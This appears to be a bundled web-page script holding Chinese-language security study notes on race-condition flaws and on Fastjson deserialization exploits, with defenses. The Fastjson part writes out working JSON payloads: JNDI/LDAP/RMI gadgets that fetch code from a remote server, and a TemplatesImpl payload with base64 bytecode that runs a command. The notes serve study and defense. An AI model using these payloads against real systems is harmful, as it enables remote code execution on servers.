                        1\u3001\u5FC5\u987B\u4F7F\u7528\u7684\u6A21\u5757\u662FIntruder\uFF08Burp\u7684\u6A21\u5757\uFF09\uFF0C\u5C06\u7EBF\u7A0B\u8C03\u523025\u8FDB\u884C\u591A\u7EBF\u7A0B\u5F02\u6B65\u53D1\u5305\uFF1B\u4E5F\u53EF\u4EE5\u4F7F\u7528curl\u540C\u65F6\u53D1\u5305\u3002
                                \u901A\u8FC7\u67E5\u770B\u591A\u4E2A\u5F02\u6B65\u8BF7\u6C42\u8FD4\u56DE\u7684\u4E0D\u540C\u7ED3\u679C\uFF0C\u6BD4\u598211\u4E2A\u6D4B\u8BD5\u4E2D\u670910\u4E2A\u76F8\u540C\uFF0C\u90A3\u4E00\u4E2A\u5305\u53EF\u80FD\u5C31\u662F\u653B\u51FB\u6210\u529F\u7684\u8BF7\u6C42\u3002
                2\u3001\u6F0F\u6D1E\u573A\u666F\uFF1A
                        1\u3001\u6316\u6398\u9700\u8981\u5173\u6CE8\u7684\u529F\u80FD\u70B9\u6709\uFF1A
                                \u8D2D\u4E70\uFF1A\u4ED8\u6B3E/\u8D2D\u4E70/\u79EF\u5206/\u8BA2\u5355\u64CD\u7EB5\u76F8\u5173\u7684\u6F0F\u6D1E
                                \u5151\u6362\uFF1A\u79EF\u5206/\u4F18\u60E0\u5238/\u6CE8\u518C\u9080\u8BF7\u7801\uFF08\u6848\u4F8B1\uFF09
                                \u7ED5\u8FC7\u6B21\u6570\u9650\u5236\uFF08\u6848\u4F8B2\uFF09
                                \u591A\u8FC7\u7A0B\u5904\u7406\uFF0C\u5982\u6587\u4EF6\u4E0A\u4F20\u5904\u7406\uFF08\u6848\u4F8B4\uFF09
                                \u6B64\u5916\u8FD8\u53EF\u80FD\u5B58\u5728DOS\u653B\u51FB\uFF08\u6848\u4F8B3\uFF09
                        2\u3001\u7279\u70B9\u603B\u7ED3\u6765\u8BF4\uFF0C\u5C31\u662F \u2014\u2014\u2014\u2014\u2014\u2014 \u5171\u4EAB\u540C\u4E00\u8D44\u6E90\uFF0C\u751F\u6210\u5176\u4ED6\u7ED3\u679C\u3002
                3\u3001\u6CE8\u610F\uFF1A
                        1\u3001\u8FD9\u4E2A\u6F0F\u6D1E\u5177\u6709\u5076\u73B0\u6027\uFF0C\u5F88\u53D7\u73AF\u5883\u56E0\u7D20\u7684\u5F71\u54CD\uFF0C\u6BD4\u5982\u7F51\u7EDC\u5EF6\u8FDF\u3001\u670D\u52A1\u5668\u7684\u5904\u7406\u80FD\u529B\u7B49\uFF0C\u6240\u4EE5\u53EA\u6267\u884C\u4E00\u6B21\u53EF\u80FD\u5E76\u4E0D\u4F1A\u6210\u529F\uFF0C\u5C3D\u91CF\u591A\u5C1D\u8BD5\u51E0\u6B21\u3002

        \u5B9E\u6218\u6848\u4F8B\uFF1A
                1\u3001\u79EF\u5206\u5151\u6362
                        HackerOne\u4E0A\u4E00\u4E2Aflag\u5151\u6362\u9080\u8BF7\u7801\u7684\u6848\u4F8B\uFF0C\u4F7F\u7528\u540C\u4E00Flag\u8BF7\u6C4270\u6B21\u5E76\u83B7\u5F97\u4E862\u6B21\u9080\u8BF7\uFF1A
                                xxxxxx
                        \u53E6\u4E00\u4E2ASlack\u7684\u7C7B\u4F3C\u6848\u4F8B\uFF1A
                                xxxxxx
                2\u3001\u7ED5\u8FC7\u6570\u91CF\u9650\u5236
                        1\u3001Shopify\u5546\u5E97\u5177\u6709\u6DFB\u52A0\u5730\u5740\u7684\u529F\u80FD\uFF0C\u4F46\u62E5\u6709\u7684\u5730\u70B9\u6570\u91CF\u6700\u591A\u662F4\u4E2A\uFF0C\u53EF\u4EE5\u901A\u8FC7\u591A\u7EBF\u7A0B\u53D1\u5305\u7ED5\u8FC7\u8F6F\u9650\u5236\uFF1A
                                xxxxxx
                                2\u3001\u770B\u5230\u6210\u529F\u6210\u529F\u521B\u5EFA\u4E868\u4E2A\u5730\u5740\uFF1A
                                        xxxxxx
                        2\u3001\u540C\u6837\u7684\u6848\u4F8B\u4E5F\u6709\uFF1A\u7ED5\u8FC7\u5458\u5DE5\u5E10\u6237\u6570\u91CF\u9650\u5236\u3001\u5355\u6B21\u6295\u7968\u673A\u4F1A\u7B49\uFF0C\u6709\u6570\u91CF\u4E0A\u9650\u7684\u573A\u666F\u90FD\u53EF\u4EE5\u5C1D\u8BD5\u591A\u7EBF\u7A0B\u7ED5\u8FC7\u3002
                3\u3001DOS\u653B\u51FB
                        1\u3001\u4E00\u4E2A\u5728\u5EFA\u8BAE\u63D0\u4EA4\u5904\u65E0\u9891\u7387\u9650\u5236\u4ECE\u800C\u5BFC\u81F4DOS\u7684\u6848\u4F8B\uFF1A
                                xxxxxx
                4\u3001\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E
                        1\u3001\u6587\u4EF6\u4E0A\u4F20\u4E5F\u662F\u6761\u4EF6\u7ADE\u4E89\u7684\u4E00\u4E2A\u7ECF\u5178\u6848\u4F8B\uFF0C\u5728\u4E4B\u524D\u6587\u4EF6\u4E0A\u4F20\u7684\u6C47\u603B\u4E2D\u4E5F\u6709\u63D0\u53CA\uFF1A
                                \u4F20\u9001\u95E8    https://mp.weixin.qq.com/s?__biz=MzI3MTQyNzQxMA==&mid=2247483974&idx=1&sn=c0ef38c78179ec03b7717641dc93b1bb
                        2\u3001\u6F0F\u6D1E\u4EA7\u751F\u7684\u539F\u56E0\u6765\u81EA\u6587\u4EF6\u4E0A\u4F20\u7684\u903B\u8F91\u673A\u5236\uFF0C\u591A\u8FC7\u7A0B\u7684\u5904\u7406\u673A\u5236\u90FD\u53EF\u80FD\u5B58\u5728\u8FD9\u4E2A\u95EE\u9898\uFF0C\u8865\u5145\u4E00\u4E2Agitlab\u7684\u6848\u4F8B\uFF1A
                                1\u3001Gitlab\u5141\u8BB8\u6587\u4EF6import.tar.gz\u4E0A\u4F20\uFF0C\u5B83\u4F1A\u5C06\u4E34\u65F6\u6587\u4EF6\u590D\u5236\u5230
                                        /var/opt/gitlab//tmp/project_exports/uploads/import.tar.gz\u3002
                                2\u3001\u540C\u65F6\u5B83\u4F1A\u6267\u884C\u4E00\u4E2A\u5F02\u6B65\u64CD\u4F5C\uFF0C\u8D1F\u8D23\u89E3\u538B\u7F29\u5BFC\u5165\u6587\u4EF6\u5E76\u6062\u590D\u5176\u5185\u5BB9\u3002
                                3\u3001\u4F46\u662F\uFF0C\u7531\u4E8E\u5728\u590D\u5236\u6587\u4EF6\u548C\u5904\u7406\u4F5C\u4E1A\u4E4B\u95F4\u5B58\u5728\u5EF6\u8FDF\uFF0C\u5176\u4ED6\u4EBA\u53EF\u4EE5\u4E0A\u4F20\u5177\u6709\u76F8\u540C\u6587\u4EF6\u540D\u7684\u6587\u4EF6\u3002
                                        1\u3001\u5982\u679C\u5728\u5BFC\u5165\u4F5C\u4E1A\u5904\u7406\u4E4B\u524D\u53D1\u751F\u8FD9\u79CD\u60C5\u51B5\uFF0C\u53D7\u5BB3\u8005\u5C06\u5728\u4E0D\u77E5\u4E0D\u89C9\u4E2D\u8986\u76D6\u653B\u51FB\u8005\u7684\u5BFC\u5165\u6587\u4EF6\u3002
                                        2\u3001\u5F53\u653B\u51FB\u8005\u7684\u6587\u4EF6\u88AB\u6267\u884C\u65F6\uFF0C\u5B83\u5C06\u89E3\u538B\u7F29\u53D7\u5BB3\u8005\u7684\u5BFC\u5165\u6587\u4EF6\u5E76\u6062\u590D\u653B\u51FB\u8005\u5B58\u50A8\u5E93\u4E2D\u7684\u6587\u4EF6\u3002
                                                \u6F0F\u6D1E\u653B\u51FB\u4E0D\u6613\u89E6\u53D1\uFF0C\u601D\u8DEF\u4E5F\u4E0D\u6613\u60F3\u5230\u3002

        \u6F0F\u6D1E\u9632\u5FA1
                1\u3001\u5BF9\u4E8E\u4E1A\u52A1\u7AEF\u6761\u4EF6\u7ADE\u4E89\u7684\u9632\u8303\uFF0C\u4E00\u822C\u7684\u65B9\u6CD5\u662F\u8BBE\u7F6E\u9501\uFF1B
                2\u3001\u5BF9\u4E8E\u6587\u4EF6\u4E0A\u4F20\uFF0C\u4E00\u5B9A\u8981\u7ECF\u8FC7\u5145\u5206\u5B8C\u6574\u7684\u68C0\u67E5\u4E4B\u540E\u518D\u4E0A\u4F20\uFF1B
                3\u3001\u5728\u64CD\u4F5C\u7CFB\u7EDF\u7684\u89D2\u5EA6\uFF0C\u5171\u4EAB\u6570\u636E\u8981\u8FDB\u884C\u4E0A\u9501\u4FDD\u62A4\u3002

        \u4E8C\u8FDB\u5236\u7684\u300A\u6761\u4EF6\u7ADE\u4E89\u6F0F\u6D1E\u300B      \uFF08\u6682\u672A\u505A\u5B8C\uFF09
                \u8D44\u6599\uFF1A
                        \u8FD8\u672A\u8BFB\u5B8C\uFF1A
                                \u5927\u7EB2\uFF1Ahttps://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E.html

                                \u810F\u725B\u8BB2\u89E3\uFF1Ahttps://www.cnblogs.com/0xJDchen/p/5988275.html
                \u5185\u5BB9\uFF1A
                        \u6682\u672A\u6DFB\u52A0
`,lu=`
      \u9ED1\u540D\u5355\u7ED5\u8FC7\uFF1A
              fastjson <= 1.2.62 \u7248\u672C
                      payload\u5982\u4E0B\uFF1B
                              {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}";
              fastjson <= 1.2.66 \u7248\u672C
                      \u5229\u7528\u6761\u4EF6\u7684\u9650\u5236\uFF1A
                              autoTypeSupport\u5C5E\u6027\u4E3Atrue\u624D\u80FD\u4F7F\u7528\u3002\uFF08fastjson >= 1.2.25\u9ED8\u8BA4\u4E3Afalse\uFF09
                      payload\u5982\u4E0B\uFF1A
                              {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
                              {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://x.x.x.x:1389/Calc"}
                              {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1399/Calc"}}
                              {"@type":"java.util.Properties","UserTransaction":"ldap://x.x.x.x:1389/Calc"}}
`,H=[Object(u.c)("\u539F\u7406",`
  2. \u539F\u7406\uFF1A

      1\u3001Fastjson\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u88AB\u5229\u7528\u7684\u539F\u56E0\uFF0C\u53EF\u4EE5\u5F52\u7ED3\u4E3A\u4E24\u65B9\u9762\uFF1A
              1\u3001Fastjson\u63D0\u4F9B\u4E86\u53CD\u5E8F\u5217\u5316\u529F\u80FD\uFF0C\u5141\u8BB8\u7528\u6237\u5728\u8F93\u5165JSON\u4E32\u65F6\u901A\u8FC7\u201C@type\u201D\u952E\u5BF9\u5E94\u7684value\u6307\u5B9A\u4EFB\u610F\u53CD\u5E8F\u5217\u5316\u7C7B\u540D\uFF1B
              2\u3001Fastjson\u81EA\u5B9A\u4E49\u7684\u53CD\u5E8F\u5217\u5316\u673A\u5236\u4F1A\u4F7F\u7528\u53CD\u5C04\u751F\u6210\u4E0A\u8FF0\u6307\u5B9A\u7C7B\u7684\u5B9E\u4F8B\u5316\u5BF9\u8C61\uFF0C\u5E76\u81EA\u52A8\u8C03\u7528\u8BE5\u5BF9\u8C61\u7684setter\u65B9\u6CD5\u53CA\u90E8\u5206getter\u65B9\u6CD5\u3002

      2\u3001\u6F0F\u6D1E\u7684\u6839\u672C\u539F\u56E0\u8FD8\u662FFastjson\u7684autotype\u529F\u80FD\uFF0C\u6B64\u529F\u80FD\u53EF\u4EE5\u53CD\u5E8F\u5217\u5316\u7684\u65F6\u5019\u4EBA\u4E3A\u6307\u5B9A\u7CBE\u5FC3\u8BBE\u8BA1\u7684\u7C7B\uFF0C\u8FBE\u6210\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\uFF1B
              1\u3001\u53CD\u5E8F\u5217\u5316\u65F6JSON\u5B57\u7B26\u4E32@type\u7684\u503C\u6307\u5B9A\u4E86\u8981\u5C06\u6B64JSON\u5B57\u7B26\u4E32\u5B9E\u4F8B\u5316\u4E3A\u4EC0\u4E48\u5BF9\u8C61\uFF0C\u5728\u6B64\u8FC7\u7A0B\u4E2Dfastjson\u8C03\u7528\u4E86setter/getter\uFF0C\u5176\u4E2D\u4EE5get/set\u5F00\u5934\u4E14\u6EE1\u8DB3\u4E00\u4E0B\u6761\u4EF6\u90FD\u4F1A\u88AB\u8C03\u7528\u5230\uFF1A
                      1\u3001\u65B9\u6CD5\u540D\u79F0\u957F\u5EA6\u5927\u4E8E\u7B49\u4E8E4
                      2\u3001\u975E\u9759\u6001\u65B9\u6CD5
                      3\u3001\u65B9\u6CD5\u540D\u4EE5get\u5F00\u5934\uFF0C\u4E14\u7B2C\u56DB\u4E2A\u5B57\u7B26\u4E3A\u5927\u5199\u5B57\u6BCD\u5982getAge
                      4\u3001\u65B9\u6CD5\u65E0\u9700\u4F20\u53C2
                      5\u3001\u65B9\u6CD5\u8FD4\u56DE\u503C\u96C6\u6210\u81EACollection,Map,AtomicBoolean,AtomicInteger,AtomicLong\u7684\u5176\u4E2D\u4E00\u79CD
              2\u3001\u5BF9\u4E8E\u672A\u63D0\u4F9Bsetter\u7684\u79C1\u6709Field\uFF0Cfastjson\u5728\u53CD\u5E8F\u5217\u5316\u65F6\u9700\u8981\u663E\u5F0F\u63D0\u4F9B\u53C2\u6570\u2014\u2014\u2014\u2014Feature.SupportNonPublicField\u624D\u4F1A\u6B63\u786E\u8D4B\u503C\u3002
              3\u3001fastjson\u5728\u4E3A\u7C7B\u5C5E\u6027\u5BFB\u627Egetter/setter\u65B9\u6CD5\u65F6\uFF0C\u8C03\u7528\u51FD\u6570com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()\u65B9\u6CD5\uFF0C\u4F1A\u5FFD\u7565 _\u4E0B\u5212\u7EBF \u5B57\u7B26\u4E32

      3\u3001\u9488\u5BF9\u300A\u7248\u672C 1.2.68 \u4EE5\u4E0B\u300B\u7684\u7248\u672C\uFF1A
              1\u3001FastJson\u5728\u89E3\u6790json\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u652F\u6301\u4F7F\u7528autoType\u6765\u5B9E\u4F8B\u5316\u67D0\u4E00\u4E2A\u5177\u4F53\u7684\u7C7B\uFF0C\u5E76\u8C03\u7528\u8BE5\u7C7B\u7684set/get\u65B9\u6CD5\u6765\u8BBF\u95EE\u5C5E\u6027\u3002
                      \u901A\u8FC7\u67E5\u627E\u4EE3\u7801\u4E2D\u76F8\u5173\u7684\u65B9\u6CD5\uFF0C\u5373\u53EF\u6784\u9020\u51FA\u4E00\u4E9B\u6076\u610F\u5229\u7528\u94FE\u3002
              2\u3001\u901A\u4FD7\u7406\u89E3\u5C31\u662F\uFF1A\u6F0F\u6D1E\u5229\u7528fastjson autotype\u5728\u5904\u7406json\u5BF9\u8C61\u7684\u65F6\u5019\uFF0C\u672A\u5BF9@type\u5B57\u6BB5\u8FDB\u884C\u5B8C\u5168\u7684\u5B89\u5168\u6027\u9A8C\u8BC1
                      \u653B\u51FB\u8005\u53EF\u4EE5\u4F20\u5165\u5371\u9669\u7C7B\uFF0C\u5E76\u8C03\u7528\u5371\u9669\u7C7B\u8FDE\u63A5\u8FDC\u7A0Brmi\u4E3B\u673A\uFF0C\u901A\u8FC7\u5176\u4E2D\u7684\u6076\u610F\u7C7B\u6267\u884C\u4EE3\u7801\u3002
                              \u653B\u51FB\u8005\u901A\u8FC7\u8FD9\u79CD\u65B9\u5F0F\u53EF\u4EE5\u5B9E\u73B0\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u7684\u5229\u7528\uFF0C\u83B7\u53D6\u670D\u52A1\u5668\u7684\u654F\u611F\u4FE1\u606F\u6CC4\u9732\uFF0C\u751A\u81F3\u53EF\u4EE5\u5229\u7528\u6B64\u6F0F\u6D1E\u8FDB\u4E00\u6B65\u5BF9\u670D\u52A1\u5668\u6570\u636E\u8FDB\u884C\u4FEE\u6539\uFF0C\u589E\u52A0\uFF0C\u5220\u9664\u7B49\u64CD\u4F5C\uFF0C\u5BF9\u670D\u52A1\u5668\u9020\u6210\u5DE8\u5927\u5F71\u54CD\u3002

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u591A\u79CD\u5229\u7528\u65B9\u5F0F\uFF0CRMI\u534F\u8BAE\u3001LDAP\u534F\u8BAE\u3001JNDI\u534F\u8BAE",`

  \u591A\u79CD\u5229\u7528\u65B9\u5F0F
      1.\u300ARMI\u300B\u534F\u8BAE
          RMI\uFF08Remote Method Invocation\uFF09\u662F\u4E13\u4E3AJava\u73AF\u5883\u8BBE\u8BA1\u7684\u8FDC\u7A0B\u65B9\u6CD5\u8C03\u7528\u673A\u5236\uFF0C\u8FDC\u7A0B\u670D\u52A1\u5668\u5B9E\u73B0\u5177\u4F53\u7684Java\u65B9\u6CD5\u5E76\u63D0\u4F9B\u63A5\u53E3\uFF0C
          \u5BA2\u6237\u7AEF\u672C\u5730\u4EC5\u9700\u6839\u636E\u63A5\u53E3\u7C7B\u7684\u5B9A\u4E49\uFF0C\u63D0\u4F9B\u76F8\u5E94\u7684\u53C2\u6570\u5373\u53EF\u8C03\u7528\u8FDC\u7A0B\u65B9\u6CD5\u3002RMI\u4F9D\u8D56\u7684\u901A\u4FE1\u534F\u8BAE\u4E3AJRMP(Java Remote Message Protocol \uFF0CJava \u8FDC\u7A0B\u6D88\u606F\u4EA4\u6362\u534F\u8BAE)\uFF0C
          \u8BE5\u534F\u8BAE\u4E3AJava\u5B9A\u5236\uFF0C\u8981\u6C42\u670D\u52A1\u7AEF\u4E0E\u5BA2\u6237\u7AEF\u90FD\u4E3AJava\u7F16\u5199\u3002
          \u8FD9\u4E2A\u534F\u8BAE\u5C31\u50CFHTTP\u534F\u8BAE\u4E00\u6837\uFF0C\u89C4\u5B9A\u4E86\u5BA2\u6237\u7AEF\u548C\u670D\u52A1\u7AEF\u901A\u4FE1\u8981\u6EE1\u8DB3\u7684\u89C4\u8303\u3002\u5728RMI\u4E2D\u5BF9\u8C61\u662F\u901A\u8FC7\u5E8F\u5217\u5316\u65B9\u5F0F\u8FDB\u884C\u7F16\u7801\u4F20\u8F93\u7684\u3002
          RMI\u670D\u52A1\u7AEF\u53EF\u4EE5\u76F4\u63A5\u7ED1\u5B9A\u8FDC\u7A0B\u8C03\u7528\u7684\u5BF9\u8C61\u4EE5\u5916\uFF0C\u8FD8\u53EF\u901A\u8FC7References\u7C7B\u6765\u7ED1\u5B9A\u4E00\u4E2A\u5916\u90E8\u7684\u8FDC\u7A0B\u5BF9\u8C61\uFF0C\u5F53RMI\u7ED1\u5B9A\u4E86References\u4E4B\u540E\uFF0C
          \u9996\u5148\u4F1A\u5229\u7528Referenceable.getReference()\u83B7\u53D6\u7ED1\u5B9A\u5BF9\u8C61\u7684\u5F15\u7528\uFF0C\u5E76\u5728\u76EE\u5F55\u4E2D\u4FDD\u5B58\uFF0C
          \u5F53\u5BA2\u6237\u7AEF\u4F7F\u7528lookup\u83B7\u53D6\u5BF9\u5E94\u540D\u5B57\u65F6\uFF0C\u4F1A\u8FD4\u56DEReferenceWrapper\u7C7B\u7684\u4EE3\u7406\u6587\u4EF6\uFF0C\u7136\u540E\u4F1A\u8C03\u7528getReference()\u83B7\u53D6Reference\u7C7B\uFF0C
          \u6700\u7EC8\u901A\u8FC7factory\u7C7B\u5C06Reference\u8F6C\u6362\u4E3A\u5177\u4F53\u7684\u5BF9\u8C61\u5B9E\u4F8B\u3002
      2.\u300ALDAP\u300B\u534F\u8BAE
      3.\u300AJNDI\u300B\u534F\u8BAE
          JNDI\u662F Java \u547D\u540D\u4E0E\u76EE\u5F55\u63A5\u53E3\uFF08Java Naming and Directory Interface\uFF09\uFF0C\u5728J2EE\u89C4\u8303\u4E2D\u662F\u91CD\u8981\u7684\u89C4\u8303\u4E4B\u4E00\u3002
          JNDI\u63D0\u4F9B\u7EDF\u4E00\u7684\u5BA2\u6237\u7AEFAPI\uFF0C\u4E3A\u5F00\u53D1\u4EBA\u5458\u63D0\u4F9B\u4E86\u67E5\u627E\u548C\u8BBF\u95EE\u5404\u79CD\u547D\u540D\u548C\u76EE\u5F55\u670D\u52A1\u7684\u901A\u7528\u3001\u7EDF\u4E00\u7684\u63A5\u53E3\uFF0C\u53EF\u4EE5\u7528\u6765\u5B9A\u4F4D\u7528\u6237\u3001\u7F51\u7EDC\u3001\u673A\u5668\u3001\u5BF9\u8C61\u548C\u670D\u52A1\u7B49\u5404\u79CD\u8D44\u6E90\u3002
          \u6BD4\u5982\u53EF\u4EE5\u5229\u7528JNDI\u518D\u5C40\u57DF\u7F51\u4E0A\u5B9A\u4F4D\u4E00\u53F0\u6253\u5370\u673A\uFF0C\u4E5F\u53EF\u4EE5\u7528JNDI\u6765\u5B9A\u4F4D\u6570\u636E\u5E93\u670D\u52A1\u6216\u4E00\u4E2A\u8FDC\u7A0BJava\u5BF9\u8C61\u3002
          JNDI\u5E95\u5C42\u652F\u6301RMI\u8FDC\u7A0B\u5BF9\u8C61\uFF0CRMI\u6CE8\u518C\u7684\u670D\u52A1\u53EF\u4EE5\u901A\u8FC7JNDI\u63A5\u53E3\u6765\u8BBF\u95EE\u548C\u8C03\u7528\u3002

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u7248\u672C 1.1.22-1.2.24",`

  \u7248\u672C 1.1.22-1.2.24
      JdbcRowSetImpl\u5229\u7528\u94FE
              1\u3001com.sun.rowset.JdbcRowSetImpl \u7C7B\u4E2D\u7684setAutoCommit()\u51FD\u6570\u8C03\u7528\u4E86connect()\u51FD\u6570\uFF0C\u8BE5\u51FD\u6570\u4E2D\u5B58\u5728jndi\u6CE8\u5165\uFF0C\u4E14getDataSourceName()\u83B7\u53D6\u7684DataSourceName\u503C\u4E5F\u662F\u53EF\u63A7\u7684
                      xxxxxx
              2\u3001\u7F16\u5199exp\uFF0C\u6784\u9020\u4E00\u4E0Bpayload
                      payload\u5185\u5BB9\uFF1A
                              {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/ut3kwl","autoCommit":true}
                      \u8BB2\u89E3\uFF1A
                              \u6307\u5B9Atype\u4E3AJdbcRowSetImpl\u7C7B\uFF0C\u4F20\u5165dataSourceName\u548CautoCommit\u53EF\u4EE5\u8C03\u7528\u5230setAutoCommit()\u548CsetDataSourceName()\u65B9\u6CD5\uFF0C\u901A\u8FC7JNDI-Injection-Exploit\u751F\u6210JNDI\u94FE\u63A5\uFF0C\u5B9E\u73B0jndi\u6CE8\u5165
      TemplatesImpl\u5229\u7528\u94FE
              1\u3001\u56E0\u4E3A com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl \u7C7B\u91CC\u9762\u90FD\u662F\u79C1\u6709\u53D8\u91CF\uFF0C\u8BE5\u94FE\u5728\u53CD\u5E8F\u5217\u5316\u65F6\u9700\u8981\u52A0\u4E0AFeature.SupportNonPublicField\u53C2\u6570
              2\u3001\u94FE\u6761\uFF1A
                      1\u3001TemplatesImpl\u7C7B\u4E2D getOutputProperties() \u65B9\u6CD5\u8C03\u7528\u4E86 newTransformer()
                      2\u3001newTransformer()\u8C03\u7528\u4E86getTransletInstance()
                      3\u3001getTransletInstance()\u8C03\u7528\u4E86defineTransletClasses()
                      4\u3001\u6700\u540E defineTransletClasses() \u6709\u5FAA\u73AF\u7C7B\u52A0\u8F7D\u7684\u8FC7\u7A0B\uFF0C\u53C2\u6570\u662F _bytecodes[i] \uFF0C\u8FD9\u91CC\u5C31\u662F\u5229\u7528\u70B9\uFF0C\u63A5\u4E0B\u6765\u9700\u8981\u89E3\u51B3\u8C03\u7528\u8FC7\u7A0B\u4E2D\u7684\u95EE\u9898\uFF1A
                              1\u3001\u9996\u5148\u662F\u5F00\u5934\u8BF4\u7684\u52A0\u4E0AFeature.SupportNonPublicField\u53C2\u6570
                              2\u3001\u7136\u540E\u662FgetTransletInstance()\u51FD\u6570\u4E2D_name\u4E0D\u4E3Anull\uFF0C_class\u4E3Anull
                              3\u3001_bytecodes[]\u4E2D\u52A0\u8F7D\u7684\u7C7B\u9700\u4E3AAbstractTranslet\u7684\u5B50\u7C7B

                              \u9664\u6B64\u4E4B\u5916\u8FD8\u6709fastjson\u672C\u8EAB\u7684\u529F\u80FD\u7279\u70B9\uFF1A
                              4\u3001fastjson\u5728\u4E3A\u7C7B\u5C5E\u6027\u5BFB\u627Egetter/setter\u65B9\u6CD5\u65F6\uFF0C\u8C03\u7528\u51FD\u6570com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()\u65B9\u6CD5\uFF0C\u4F1A\u5FFD\u7565_ -\u5B57\u7B26\u4E32
                              5\u3001fastjson \u5728\u53CD\u5E8F\u5217\u5316\u65F6\uFF0C\u5982\u679CField\u7C7B\u578B\u4E3Abyte[]\uFF0C\u5C06\u4F1A\u8C03\u7528com.alibaba.fastjson.parser.JSONScanner#bytesValue\u8FDB\u884Cbase64\u89E3\u7801\uFF0C\u5728\u5E8F\u5217\u5316\u65F6\u4E5F\u4F1A\u8FDB\u884Cbase64\u7F16\u7801

              3\u3001\u7F16\u5199exp\uFF0C\u6784\u9020\u4E00\u4E0Bpayload
                      1\u3001\u6240\u4EE5_bytecodes\u4F20\u5165\u539F\u7C7B\u5185\u5BB9\uFF08\u7F16\u8BD1\u524D\uFF09\u4E3A\uFF1A
                              xxxxxx
                      2\u3001\u5C06\u5176\u8F6C\u4E3A\u5B57\u8282\u7801\uFF0C\u7136\u540Ebase64\u7F16\u7801\u540E\uFF0C\u6700\u7EC8payload\u4E3A:
                                {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAiTGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0OwEAClNvdXJjZUZpbGUBAAxKREs3dTIxLmphdmEMAAQABQcAEwEAIGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAG2NvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMQEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACEKACIADwAhAAIAIgAAAAAAAgABAAQABQABAAYAAAAvAAEAAQAAAAUqtwAjsQAAAAIABwAAAAYAAQAAACoACAAAAAwAAQAAAAUACQAMAAAACAAUAAUAAQAGAAAAFgACAAAAAAAKuAAaEhy2ACBXsQAAAAAAAgANAAAAAgAOAAsAAAAKAAEAAgAQAAoACQ=="],'_name':'exp','_tfactory':{ },"_outputProperties":{ }}
  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("\u7248\u672C 1.2.25-1.2.41",`

  \u7248\u672C 1.2.25-1.2.41
      \u5B98\u65B9\u589E\u52A0\u4E86\u9650\u5236\uFF1A
              1\u3001\u8BE5\u7248\u672C\u6DFB\u52A0\u4E86\u9ED1\u540D\u5355
              2\u3001\u4E14\u6DFB\u52A0\u4E86autoTypeSupport\u53C2\u6570\u6765\u63A7\u5236\u80FD\u5426\u53CD\u5E8F\u5217\u5316\uFF0C\u9ED8\u8BA4\u4E0D\u80FD\uFF0C\u6240\u4EE5\u5229\u7528\u8303\u56F4\u53D8\u5C0F\u4E86\uFF0C\u5982\u679C\u80FD\u53CD\u5E8F\u5217\u5316\u7684\u8BDD\u4F1A\u8C03\u7528checkAutoType()\u51FD\u6570\u68C0\u67E5\u3002
                      1\u3001\u5728autoTypeSupport\u5F00\u542F\u7684\u60C5\u51B5\u4E0B
                              1\u3001\u5148\u901A\u8FC7\u767D\u540D\u5355\u8FDB\u884C\u5224\u65AD\uFF0C\u5982\u679C\u7B26\u5408\u7684\u8BDD\u5C31\u8FDB\u5165TypeUtils.loadClass\uFF0C
                              2\u3001\u7136\u540E\u5728\u901A\u8FC7\u9ED1\u540D\u5355\u8FDB\u884C\u5224\u65AD\uFF0C\u5982\u679C\u5728\u9ED1\u540D\u5355\u4E2D\u5C31\u76F4\u63A5\u629B\u51FA\u5F02\u5E38\uFF0C\u5426\u5219\u8FDB\u5165\u5230TypeUtils.loadClass\u4E2D
